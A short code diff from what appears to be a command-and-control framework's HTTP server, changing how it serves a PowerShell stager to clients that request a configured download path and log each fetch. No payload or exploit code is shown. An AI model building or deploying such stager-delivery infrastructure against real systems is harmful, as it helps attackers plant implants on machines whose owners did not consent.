@@ -82,7 +82,7 @@ def HTTPDFactory(config):
             path = self.path.split("/")[-1]
             if path == self.config.get("http-download-path"):
                 Log.log_event("Download Stager", "PowerShell stager was fetched from %s (%s)" % (self.client_address[0], self.address_string()))
-                self.output = Utils.load_powershell_script("stager.ps1", 29).replace("\r", "\r\n")
+                self.output = Utils.load_powershell_script("stager.ps1", 29)
             elif path in Utils.get_download_folder_content():
                 self.output = Utils.load_file("download/%s" % path)
                 Log.log_event("Download File", "%s was downloaded from %s (%s)" % (path, self.client_address[0], self.address_string()))
